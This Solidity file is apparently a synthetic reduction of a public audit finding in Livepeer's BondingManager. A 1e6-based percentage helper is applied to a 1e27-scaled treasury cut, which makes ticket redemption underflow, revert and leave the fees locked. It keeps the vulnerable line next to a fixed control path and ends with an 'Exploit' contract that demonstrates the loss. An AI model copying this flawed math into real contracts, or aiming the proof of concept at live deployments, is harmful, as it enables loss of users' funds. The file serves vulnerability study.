// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Livepeer — Underflow in updateTranscoderWithFees can cause corrupted data
    and loss of winning tickets (Code4rena 2023-08, [H-01], #27047)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: treasuryRewardCutRate is validated/stored as a PreciseMathUtils
    percentage (PERC_DIVISOR = 1e27), but updateTranscoderWithFees computes
    treasuryRewards with MathUtils.percOf (PERC_DIVISOR = 1e6). With LIP-92's
    10% cut (1e26), MathUtils returns rewards * 1e20, so
    `rewards = rewards.sub(treasuryRewards)` underflows and reverts.

    Impact: whenever a transcoder skipped the previous-round reward call,
    redeeming a winning ticket (which must recompute rewards) always fails.
    Tickets are only valid for two rounds — the fees are permanently lost.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Livepeer MathUtils — PERC_DIVISOR = 1e6 (verbatim constant).
library MathUtils {
    // Divisor used for representing percentages
    uint256 public constant PERC_DIVISOR = 1000000;

    function percOf(uint256 _amount, uint256 _fracNum) internal pure returns (uint256) {
        return (_amount * _fracNum) / PERC_DIVISOR;
    }

    function validPerc(uint256 _amount) internal pure returns (bool) {
        return _amount <= PERC_DIVISOR;
    }
}

/// @dev Livepeer PreciseMathUtils — PERC_DIVISOR = 1e27 (verbatim constant).
library PreciseMathUtils {
    // Divisor used for representing percentages
    uint256 public constant PERC_DIVISOR = 10 ** 27;

    function percOf(uint256 _amount, uint256 _fracNum) internal pure returns (uint256) {
        return (_amount * _fracNum) / PERC_DIVISOR;
    }

    function validPerc(uint256 _amount) internal pure returns (bool) {
        return _amount <= PERC_DIVISOR;
    }
}

/// @dev Minimal ERC20 for ticket fees / LPT-denominated fee accounting.
contract FeeToken {
    string public constant name = "Livepeer Fee Token";
    string public constant symbol = "FEE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced BondingManager with the MathUtils vs PreciseMathUtils bug.
contract BondingManager {
    using MathUtils for uint256;

    FeeToken public immutable feeToken;
    address public ticketBroker;

    // LIP-92: 10% treasury cut stored as PreciseMathUtils percentage
    // 10% of 1e27 = 1e26
    uint256 public treasuryRewardCutRate;

    struct Transcoder {
        uint256 lastRewardRound;
        uint256 cumulativeFees;
        bool active;
    }

    mapping(address => Transcoder) public transcoders;
    uint256 public currentRound;

    error NotTicketBroker();
    error UnderflowDoS();

    constructor(FeeToken _feeToken) {
        feeToken = _feeToken;
        currentRound = 10;
    }

    function setTicketBroker(address _broker) external {
        ticketBroker = _broker;
    }

    /// @notice Mirrors `_setTreasuryRewardCutRate` — validates with PreciseMathUtils.
    function setTreasuryRewardCutRate(uint256 _cutRate) external {
        require(PreciseMathUtils.validPerc(_cutRate), "_cutRate is invalid precise percentage");
        treasuryRewardCutRate = _cutRate;
    }

    function seedTranscoder(address _t, uint256 lastRewardRound) external {
        transcoders[_t] = Transcoder({lastRewardRound: lastRewardRound, cumulativeFees: 0, active: true});
    }

    function setCurrentRound(uint256 r) external {
        currentRound = r;
    }

    /*//////////////// updateTranscoderWithFees (VERBATIM bug shape) ////////////////*/
    /// @dev Called every time a winning ticket is redeemed. When the transcoder
    ///      skipped the previous round reward call, rewards must be recomputed.
    function updateTranscoderWithFees(address _transcoder, uint256 _fees, uint256 /*_round*/) external {
        if (msg.sender != ticketBroker) revert NotTicketBroker();
        Transcoder storage t = transcoders[_transcoder];
        require(t.active, "inactive transcoder");

        // Recompute rewards path when previous-round reward was skipped
        // (lastRewardRound < currentRound - 1). This is the LIP-92 path that
        // always hits the treasury cut math.
        uint256 rewards = _fees; // reduced: mintable rewards tied to fees for the skipped round
        if (t.lastRewardRound < currentRound - 1) {
            // VERBATIM vulnerable line — MathUtils used instead of PreciseMathUtils
            uint256 treasuryRewards = MathUtils.percOf(rewards, treasuryRewardCutRate); // @> VULN: MathUtils (1e6) on PreciseMath cut (1e27) → treasuryRewards >> rewards
            // FIX: uint256 treasuryRewards = PreciseMathUtils.percOf(rewards, treasuryRewardCutRate);
            // rewards = rewards.sub(treasuryRewards) — underflows when treasuryRewards > rewards
            rewards = rewards - treasuryRewards; // underflows / reverts under 0.8 checked math
        }

        // Accounting updates that never run when the underflow reverts:
        t.cumulativeFees = t.cumulativeFees + rewards;
        t.lastRewardRound = currentRound;

        // Pay the transcoder its fees (only if the math above succeeded)
        feeToken.transfer(_transcoder, _fees);
    }

    /// @notice Control path: same logic with PreciseMathUtils (the recommended fix).
    function updateTranscoderWithFeesFixed(address _transcoder, uint256 _fees) external {
        if (msg.sender != ticketBroker) revert NotTicketBroker();
        Transcoder storage t = transcoders[_transcoder];
        uint256 rewards = _fees;
        if (t.lastRewardRound < currentRound - 1) {
            uint256 treasuryRewards = PreciseMathUtils.percOf(rewards, treasuryRewardCutRate);
            rewards = rewards - treasuryRewards;
        }
        t.cumulativeFees = t.cumulativeFees + rewards;
        t.lastRewardRound = currentRound;
        feeToken.transfer(_transcoder, _fees);
    }
}

/// @notice Reduced TicketBroker. Holds winning-ticket fee collateral and calls
///         BondingManager.updateTranscoderWithFees on redeem. Tickets expire after
///         two rounds (Livepeer PM spec) — if redeem reverts in the second round,
///         the fees are permanently lost.
contract TicketBroker {
    FeeToken public immutable feeToken;
    BondingManager public immutable bonding;

    struct Ticket {
        address transcoder;
        uint256 fees;
        uint256 creationRound;
        bool redeemed;
        bool expired;
    }

    mapping(uint256 => Ticket) public tickets;
    uint256 public nextTicketId;

    constructor(FeeToken _feeToken, BondingManager _bonding) {
        feeToken = _feeToken;
        bonding = _bonding;
    }

    function seedWinningTicket(address transcoder, uint256 fees, uint256 creationRound) external returns (uint256 id) {
        id = ++nextTicketId;
        tickets[id] = Ticket({
            transcoder: transcoder,
            fees: fees,
            creationRound: creationRound,
            redeemed: false,
            expired: false
        });
        // Fees sit in the broker until redeem succeeds
        feeToken.transferFrom(msg.sender, address(this), fees);
    }

    /// @notice Redeem a winning ticket. Validity window = creationRound and creationRound+1.
    function redeemWinningTicket(uint256 id) external {
        Ticket storage t = tickets[id];
        require(!t.redeemed && !t.expired, "dead ticket");
        uint256 r = bonding.currentRound();
        // Two-round validity (Livepeer PM spec)
        if (r > t.creationRound + 1) {
            t.expired = true;
            return;
        }
        // Approve BondingManager to pull fees for the transcoder payout
        feeToken.approve(address(bonding), t.fees);
        // Must transfer fees to BondingManager first so it can pay the transcoder
        feeToken.transfer(address(bonding), t.fees);
        bonding.updateTranscoderWithFees(t.transcoder, t.fees, r);
        t.redeemed = true;
    }

    /// @notice Expire tickets past the two-round window (simulates round advance).
    function expireIfStale(uint256 id) external {
        Ticket storage t = tickets[id];
        if (!t.redeemed && bonding.currentRound() > t.creationRound + 1) {
            t.expired = true;
        }
    }
}

/// @notice Orchestrates: LIP-92 10% precise treasury cut, transcoder skipped reward,
///         winning ticket in previous round, redeem in current round → underflow DoS
///         → ticket expires → fees permanently locked in the BondingManager (or lost).
contract Exploit {
    // LIP-92 initial treasuryRewardCutRate = 10% as PreciseMathUtils percentage
    uint256 public constant TEN_PERCENT_PRECISE = 10 ** 26; // 0.1 * 1e27
    uint256 public constant TICKET_FEES = 1000 ether;

    FeeToken public feeToken;
    BondingManager public bonding;
    TicketBroker public broker;

    address public transcoder;

    uint256 public ticketId;
    uint256 public brokerStart;
    uint256 public brokerEnd;
    uint256 public transcoderPaid;
    bool public redeemReverted;
    bool public ticketExpired;

    constructor() {
        transcoder = address(0xBEEF); // fixed victim transcoder

        feeToken = new FeeToken(); // CREATE 1
        bonding = new BondingManager(feeToken); // CREATE 2
        broker = new TicketBroker(feeToken, bonding); // CREATE 3
        bonding.setTicketBroker(address(broker));

        // Protocol sets 10% treasury cut (PreciseMathUtils-validated)
        bonding.setTreasuryRewardCutRate(TEN_PERCENT_PRECISE);

        // Transcoder active but skipped reward in round 9 (lastRewardRound = 8)
        // Current round will be 10 → lastRewardRound < currentRound - 1 → recompute path
        bonding.seedTranscoder(transcoder, 8);
        bonding.setCurrentRound(10);

        // Seed a winning ticket created in round 9 (valid in rounds 9 and 10)
        feeToken.mint(address(this), TICKET_FEES);
        feeToken.approve(address(broker), TICKET_FEES);
        ticketId = broker.seedWinningTicket(transcoder, TICKET_FEES, 9);
    }

    function run() external {
        // Fees sit in the broker as winning-ticket collateral
        brokerStart = feeToken.balanceOf(address(broker));
        require(brokerStart == TICKET_FEES, "ticket fees must be escrowed");

        // Attempt redeem in round 10 (still within the two-round validity window).
        // Because the transcoder skipped round-9 rewards, updateTranscoderWithFees
        // hits the MathUtils treasury cut and underflows → entire redeem reverts
        // (fees roll back to the broker).
        try broker.redeemWinningTicket(ticketId) {
            redeemReverted = false;
        } catch {
            redeemReverted = true;
        }

        // Advance past validity window → ticket permanently unredeemable
        bonding.setCurrentRound(12);
        broker.expireIfStale(ticketId);
        (, , , bool redeemed, bool expired) = broker.tickets(ticketId);
        ticketExpired = expired && !redeemed;

        transcoderPaid = feeToken.balanceOf(transcoder);
        brokerEnd = feeToken.balanceOf(address(broker));

        // HARM: redeem failed due to underflow; ticket expired; transcoder got nothing;
        // the 1000 FEE of winning-ticket value is stuck forever in the broker.
        require(redeemReverted, "redeem should underflow-revert");
        require(ticketExpired, "ticket should expire unredeemed");
        require(transcoderPaid == 0, "transcoder must not receive fees");
        require(brokerEnd == TICKET_FEES, "ticket fees still locked, not paid out");
    }
}
